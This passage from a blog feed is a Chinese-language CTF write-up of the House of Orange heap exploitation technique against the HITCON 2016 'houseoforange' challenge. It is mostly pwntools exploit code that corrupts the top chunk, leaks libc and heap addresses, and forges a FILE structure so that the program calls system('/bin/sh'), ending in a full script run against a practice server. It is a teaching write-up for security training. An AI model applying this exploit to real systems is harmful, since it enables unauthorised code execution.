class="hljs-keyword">lambda</span> data               :sh.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :sh.sendlineafter(delim, data)<br>r       = <span class="hljs-keyword">lambda</span> num=<span class="hljs-number">4096</span>           :sh.recv(num)<br>ru      = <span class="hljs-keyword">lambda</span> delims  :sh.recvuntil(delims )<br>itr     = <span class="hljs-keyword">lambda</span>                    :sh.interactive()<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>,<span class="hljs-string">'\0'</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\0'</span>))<br>leak    = <span class="hljs-keyword">lambda</span> name,addr          :log.success(<span class="hljs-string">'{} = {:#x}'</span>.<span class="hljs-built_in">format</span>(name, addr))<br>lg=<span class="hljs-keyword">lambda</span> address,data:log.success(<span class="hljs-string">'%s: '</span>%(address)+<span class="hljs-built_in">hex</span>(data))<br><span class="hljs-comment">#定义gdb调试函数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>():<br>        gdb.attach(sh)<br>        pause()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content, price=<span class="hljs-string">'2'</span>, color=<span class="hljs-string">'1'</span></span>):<br>    ru(<span class="hljs-string">"Your choice : "</span>)<br>    sl(<span class="hljs-string">'1'</span>)<br>    ru(<span class="hljs-string">"Length of name :"</span>)<br>    sl(<span class="hljs-built_in">str</span>(size))<br>    ru(<span class="hljs-string">"Name :"</span>)<br>    sh.send(content)<br>    ru(<span class="hljs-string">"Price of Orange:"</span>)<br>    sl(<span class="hljs-built_in">str</span>(price))<br>    ru(<span class="hljs-string">"Color of Orange:"</span>)    <span class="hljs-comment">#1-7</span><br>    sl(<span class="hljs-built_in">str</span>(color))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    ru(<span class="hljs-string">"Your choice : "</span>)<br>    sl(<span class="hljs-string">'2'</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">size, content, price=<span class="hljs-string">'2'</span>, color=<span class="hljs-string">'1'</span></span>):<br>    ru(<span class="hljs-string">"Your choice : "</span>)<br>    sl(<span class="hljs-string">'3'</span>)<br>    ru(<span class="hljs-string">"Length of name :"</span>)<br>    sl(<span class="hljs-built_in">str</span>(size))<br>    ru(<span class="hljs-string">"Name:"</span>)<br>    sh.send(content)<br>    ru(<span class="hljs-string">"Price of Orange:"</span>)<br>    sl(<span class="hljs-built_in">str</span>(price))<br>    ru(<span class="hljs-string">"Color of Orange:"</span>)    <span class="hljs-comment">#1-7</span><br>    sl(<span class="hljs-built_in">str</span>(color))<br></code></pre></td></tr></tbody></table></figure><h3 id="修改top-chunk"><a href="#修改top-chunk" class="headerlink" title="修改top-chunk"></a>修改top chunk</h3><p>随便申请一个chunk，然后利用edit函数，溢出修改topchunk</p><figure class="highlight gcode"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gcode">add<span class="hljs-comment">(0x30,'aaaa\n')</span><br>dbg<span class="hljs-comment">()</span><br>payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0</span>x<span class="hljs-number">30</span> +p<span class="hljs-number">64</span><span class="hljs-comment">(0)</span> + p<span class="hljs-number">64</span><span class="hljs-comment">(0x21)</span> + p<span class="hljs-number">32</span><span class="hljs-comment">(2)</span> + p<span class="hljs-number">32</span><span class="hljs-comment">(2)</span> + p<span class="hljs-number">64</span><span class="hljs-comment">(0)</span> * <span class="hljs-number">2</span> + p<span class="hljs-number">64</span><span class="hljs-comment">(0xf81)</span><br>edit<span class="hljs-comment">(len(payload)</span>, payload)<br>dbg<span class="hljs-comment">()</span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/a23256312ac74a1c922b94fb13e84135.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/a23256312ac74a1c922b94fb13e84135.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"><br>top chunk大小为0x0000000000020f81<br>修改后的top chunk 大小为0x0000000000000f81<br class='item-img' data-src='https://img-blog.csdnimg.cn/259e73d11d5f45ad823f0a9bf7ff1f12.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/259e73d11d5f45ad823f0a9bf7ff1f12.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p><h3 id="申请大于top-chunk的chunk，进入unsortedbin"><a href="#申请大于top-chunk的chunk，进入unsortedbin" class="headerlink" title="申请大于top-chunk的chunk，进入unsortedbin"></a>申请大于top chunk的chunk，进入unsortedbin</h3><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x1000, <span class="hljs-string">'a\n'</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/d36f2307ea63433d8af823bfb7a100a0.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/d36f2307ea63433d8af823bfb7a100a0.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p><h3 id="泄露libc和heap"><a href="#泄露libc和heap" class="headerlink" title="泄露libc和heap"></a>泄露libc和heap</h3><p>调试可得此时我们刚刚申请的0x400chunk里存放着0x00007fe0c1216188距离libc基地址0x3c5188（0x00007fe0c1216188-0x7fe0c0e51000），该chunk里还存放着heap地址，因为printf遇到’\x00’会停止打印，所以我们将0x00007fe0c1216188改为字符串b，再将其输出</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">add</span><span class="hljs-params">(<span class="hljs-number">0</span>x400, <span class="hljs-string">'a'</span> * <span class="hljs-number">8</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">show</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">ru</span><span class="hljs-params">(<span class="hljs-string">'a'</span>*<span class="hljs-number">8</span>)</span></span><br>libc<span class="hljs-selector-class">.address</span> = <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">ru</span>(<span class="hljs-string">'\x7f'</span>)<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>, <span class="hljs-string">'\x00'</span>)) - <span class="hljs-number">0</span>x3c5188<br><span class="hljs-function"><span class="hljs-title">lg</span><span class="hljs-params">(<span class="hljs-string">'libc.address'</span>,libc.address)</span></span><br>io_list_all = libc<span class="hljs-selector-class">.symbols</span><span class="hljs-selector-attr">[<span class="hljs-string">'_IO_list_all'</span>]</span><br>system = libc<span class="hljs-selector-class">.symbols</span><span class="hljs-selector-attr">[<span class="hljs-string">'system'</span>]</span><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/b0e56ad2215f45969686d4431486c9cd.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/b0e56ad2215f45969686d4431486c9cd.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p><p>我们泄露出的heap为0x5617117b30e0，距离heap基地址0x5617117b30e0-0x5617117b3000=0xe0，由此可获得heap_base地址</p><figure class="highlight gcode"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gcode">payload = <span class="hljs-string">'b'</span> * <span class="hljs-number">0</span>x<span class="hljs-number">10</span><br>edit<span class="hljs-comment">(0x10, payload)</span><br>show<span class="hljs-comment">()</span><br>ru<span class="hljs-comment">('b'*0x10)</span><br>heap = u<span class="hljs-number">64</span><span class="hljs-comment">(sh.recvuntil('\n')</span>.strip<span class="hljs-comment">()</span>.ljust<span class="hljs-comment">(8, '\x00')</span>)<br>heap_base = heap - <span class="hljs-number">0</span>xE<span class="hljs-number">0</span><br>lg<span class="hljs-comment">('heap_base',heap_base)</span><br>dbg<span class="hljs-comment">()</span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/2f717d520ea740d1acf13b1f48f78f98.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/2f717d520ea740d1acf13b1f48f78f98.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p><h3 id="构造fake-file"><a href="#构造fake-file" class="headerlink" title="构造fake-file"></a>构造fake_file</h3><p>接下来我们修改当前unsortedbin中chunk的大小和内容,这里FSOP还不太明白，先借用一下大佬写的解释</p><p>malloc时，对unsorted bin进行判断，此时该chunk的size为0x60，不满足要求，就把该chunk放入small bin，并且向bk-&gt;fd写入main_arena+0x58，即向_IO_list_all写入main_arena+0x58，此时判断下一个unsorted bin（_IO_list_all），而这里实际上没有chunk，此时会触发错误，此时第一个_IO_FILE_plus结构体为main_arena+0x58，而它不满足条件，就通过_chain调到下一个_IO_FILE_plus结构体，_chain位于0x68偏移的地方，main_arena+0x58+0x68=main_arena+0xc0，就是small bin中0x60大小的地方，这就回到了我们伪造的_IO_FILE_plus结构体</p><figure class="highlight gcode"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs gcode">dbg<span class="hljs-comment">()</span><br>payload = <span class="hljs-string">'a'</span> * <span class="hljs-number">0</span>x<span class="hljs-number">400</span> + p<span class="hljs-number">64</span><span class="hljs-comment">(0)</span> + p<span class="hljs-number">64</span><span class="hljs-comment">(0x21)</span> + p<span class="hljs-number">32</span><span class="hljs-comment">(2)</span> + p<span class="hljs-number">32</span><span class="hljs-comment">(1)</span> + p<span class="hljs-number">64</span><span class="hljs-comment">(0)</span><br>fake_file = <span class="hljs-string">'/bin/sh\x00'</span>+p<span class="hljs-number">64</span><span class="hljs-comment">(0x61)</span><span class="hljs-attr">#to small bin</span><br><span class="hljs-attr">fake_file += p64</span><span class="hljs-comment">(0)</span>+p<span class="hljs-number">64</span><span class="hljs-comment">(io_list_all-0x10)</span><br>fake_file += p<span class="hljs-number">64</span><span class="hljs-comment">(0)</span> + p<span class="hljs-number">64</span><span class="hljs-comment">(1)</span><span class="hljs-attr">#_IO_write_base &lt; _IO_write_ptr</span><br><span class="hljs-attr">fake_file = fake_file.ljust(0</span>xc<span class="hljs-number">0</span>,<span class="hljs-string">'\x00'</span>)<br>fake_file += p<span class="hljs-number">64</span><span class="hljs-comment">(0)</span> * <span class="hljs-number">3</span><br>fake_file += p<span class="hljs-number">64</span><span class="hljs-comment">(heap_base+0x5E8)</span> <span class="hljs-attr">#vtable ptr</span><br><span class="hljs-attr">fake_file += p64</span><span class="hljs-comment">(0)</span> * <span class="hljs-number">2</span><br>fake_file += p<span class="hljs-number">64</span><span class="hljs-comment">(system)</span><br>payload += fake_file<br>edit<span class="hljs-comment">(len(payload)</span>, payload)<br>dbg<span class="hljs-comment">()</span><br></code></pre></td></tr></tbody></table></figure><p>修改前<br class='item-img' data-src='https://img-blog.csdnimg.cn/e49a2d19a419461eb89c5c1b58bf3f99.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/e49a2d19a419461eb89c5c1b58bf3f99.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"><br>修改后<br class='item-img' data-src='https://img-blog.csdnimg.cn/c6487fe320ee4b1880bcd2c64cca274f.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/c6487fe320ee4b1880bcd2c64cca274f.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p><p>之后我们再调用add函数，调用malloc函数，就可以产生错误信息，改变程序执行流程，获得shell</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">ru</span><span class="hljs-params">(<span class="hljs-string">"Your choice : "</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">sl</span><span class="hljs-params">(<span class="hljs-string">'1'</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">itr</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight routeros"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn import  *<br> <br>context(<span class="hljs-attribute">endian</span>=<span class="hljs-string">'little'</span>,os='linux',arch='amd64',log_level='debug') #小端序，linux系统，64位架构,<span class="hljs-built_in">debug</span><br> <br>binary = <span class="hljs-string">'./houseoforange_hitcon_2016'</span>  <br><span class="hljs-comment">#sh = process(binary) #连接本地程序</span><br>sh = remote(<span class="hljs-string">'node4.buuoj.cn'</span>,26188) #连接远程程序<br>elf = ELF(binary)     <br>libc = ELF(<span class="hljs-string">'../../libc-2.23.so--64'</span>)  <br><br><span class="hljs-comment">#libc-2.23.so--64</span><br>one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]<br>one_gadget[0] = 0x45216<br>s       = lambda data               :sh.send(data)<br>sa      = lambda delim,data         :sh.sendafter(delim, data)<br>sl      = lambda data               :sh.sendline(data)<br>sla     = lambda delim,data         :sh.sendlineafter(delim, data)<br>r       = lambda <span class="hljs-attribute">num</span>=4096           :sh.recv(num)<br>ru      = lambda delims  :sh.recvuntil(delims )<br>itr     = lambda                    :sh.interactive()<br>uu32    = lambda data               :u32(data.ljust(4,<span class="hljs-string">'\0'</span>))<br>uu64    = lambda data               :u64(data.ljust(8,<span class="hljs-string">'\0'</span>))<br>leak    = lambda name,addr          <span class="hljs-keyword">:log</span>.success(<span class="hljs-string">'{} = {:#x}'</span>.format(name, addr))<br><span class="hljs-attribute">lg</span>=lambda address,data<span class="hljs-keyword">:log</span>.success(<span class="hljs-string">'%s: '</span>%(address)+hex(data))<br><span class="hljs-comment">#定义gdb调试函数</span><br>def dbg():<br>        gdb.attach(sh)<br>        pause()<br>def <span class="hljs-built_in">add</span>(size, content, <span class="hljs-attribute">price</span>=<span class="hljs-string">'2'</span>, <span class="hljs-attribute">color</span>=<span class="hljs-string">'1'</span>):<br>    ru(<span class="hljs-string">"Your choice : "</span>)<br>    sl(<span class="hljs-string">'1'</span>)<br>    ru(<span class="hljs-string">"Length of name :"</span>)<br>    sl(str(size))<br>    ru(<span class="hljs-string">"Name :"</span>)<br>    sh.send(content)<br>    ru(<span class="hljs-string">"Price of Orange:"</span>)<br>    sl(str(price))<br>    ru(<span class="hljs-string">"Color of Orange:"</span>)    #1-7<br>    sl(str(color))<br><br><br>def show():<br>    ru(<span class="hljs-string">"Your choice : "</span>)<br>    sl(<span class="hljs-string">'2'</span>)<br><br>def <span class="hljs-built_in">edit</span>(size, content, <span class="hljs-attribute">price</span>=<span class="hljs-string">'2'</span>, <span class="hljs-attribute">color</span>=<span class="hljs-string">'1'</span>):<br>    ru(<span class="hljs-string">"Your choice : "</span>)<br>    sl(<span class="hljs-string">'3'</span>)<br>    ru(<span class="hljs-string">"Length of name :"</span>)<br>    sl(str(size))<br>    ru(<span class="hljs-string">"Name:"</span>)<br>    sh.send(content)<br>    ru(<span class="hljs-string">"Price of Orange:"</span>)<br>    sl(str(price))<br>    ru(<span class="hljs-string">"Color of Orange:"</span>)    #1-7<br>    sl(str(color))<br><br><br><br><span class="hljs-built_in">add</span>(0x30,<span class="hljs-string">'aaaa\n'</span>)<br><span class="hljs-comment">#dbg()</span><br>payload = <span class="hljs-string">'a'</span> * 0x30 +p64(0) + p64(0x21) + p32(2) + p32(1) + p64(0) * 2 + p64(0xf81)<br> <br><span class="hljs-built_in">edit</span>(len(payload), payload)<br><span class="hljs-comment">#dbg()</span><br><span class="hljs-built_in">add</span>(0x1000, <span class="hljs-string">'a\n'</span>)<br><span class="hljs-comment">#dbg()</span><br><span class="hljs-built_in">add</span>(0x400, <span class="hljs-string">'a'</span> * 8)<br><span class="hljs-comment">#dbg()</span><br>show()<br>ru(<span class="hljs-string">'a'</span><span class="hljs-number">*8</span>)<br>libc.address = u64(ru(<span class="hljs-string">'\x7f'</span>).ljust(8, <span class="hljs-string">'\x00'</span>)) - 0x3c5188<br>lg(<span class="hljs-string">'libc.address'</span>,libc.address)<br>  <br>io_list_all = libc.symbols[<span class="hljs-string">'_IO_list_all'</span>]<span class="hljs-built_in"></span><br><span class="hljs-built_in">system </span>= libc.symbols[<span class="hljs-string">'system'</span>]<br><br>payload = <span class="hljs-string">'b'</span> * 0x10<br> <br><br><span class="hljs-built_in">edit</span>(0x10, payload)<br><br>show()<br>ru(<span class="hljs-string">'b'</span><span class="hljs-number">*0</span>x10)<br>heap = u64(sh.recvuntil(<span class="hljs-string">'\n'</span>).strip().ljust(8, <span class="hljs-string">'\x00'</span>))<br>heap_base = heap - 0xE0<br>lg(<span class="hljs-string">'heap_base'</span>,heap_base)<br><span class="hljs-comment">#dbg()</span><br> <br>payload = <span class="hljs-string">'a'</span> * 0x400 + p64(0) + p64(0x21) + p32(2) + p32(1) + p64(0)<br>fake_file = <span class="hljs-string">'/bin/sh\x00'</span>+p64(0x61)#<span class="hljs-keyword">to</span> small bin<br>fake_file += p64(0)+p64(io_list_all-0x10)<br>fake_file += p64(0) + p64(1)#_IO_write_base &lt; _IO_write_ptr<br>fake_file = fake_file.ljust(0xc0,<span class="hljs-string">'\x00'</span>)<br>fake_file += p64(0) * 3<br>fake_file += p64(heap_base+0x5E8) #vtable ptr<br>fake_file += p64(0) * 2<br>fake_file += p64(system)<br>payload += fake_file<br><span class="hljs-built_in">edit</span>(len(payload), payload)<br><span class="hljs-comment">#dbg()</span><br> <br>ru(<span class="hljs-string">"Your choice : "</span>)<br>sl(<span class="hljs-string">'1'</span>)<br><br>itr()<br></code></pre></td></tr></tbody></table></figure><p>可能因为本地环境没配好，打不通，在buu上远程可以打通<br class='item-img' data-src='https://img-blog.csdnimg.cn/a54c5f2bc33e4c2f8519058f1e79b38d.png?ynotemdtimestamp=1663776457420'><img src="https://img-blog.csdnimg.cn/a54c5f2bc33e4c2f8519058f1e79b38d.png?ynotemdtimestamp=1663776457420" alt="在这里插入图片描述"></p><blockquote><p>参考文章<br><a href="https://www.cnblogs.com/LynneHuan/p/14696780.html">houseoforange_hitcon_2016</a><br><a href="https://blog.csdn.net/weixin_44145820/article/details/105270036">houseoforange_hitcon_2016</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;House of orange&lt;/h1&gt;
&lt;h2 id=&quot;前提&quot;&gt;&lt;a href=&quot;#前提&quot; class=&quot;headerlink&quot; title=&quot;前提&quot;&gt;&lt;/a&gt;前提&lt;/h2&gt;
&lt;p&gt;题目中不存在 free 函数或其他释放堆块的函数。&lt;/p&gt;
&lt;h2 id=&quot;原理&quot;&gt;&lt;a</summary>
      
    
    
    
    <category term="heap" scheme="https://kylinxin.github.io/categories/heap/"/>
    
    
    <category term="House of 系列" scheme="https://kylinxin.github.io/tags/House-of-%E7%B3%BB%E5%88%97/"/>
    
  </entry>
  
</feed>
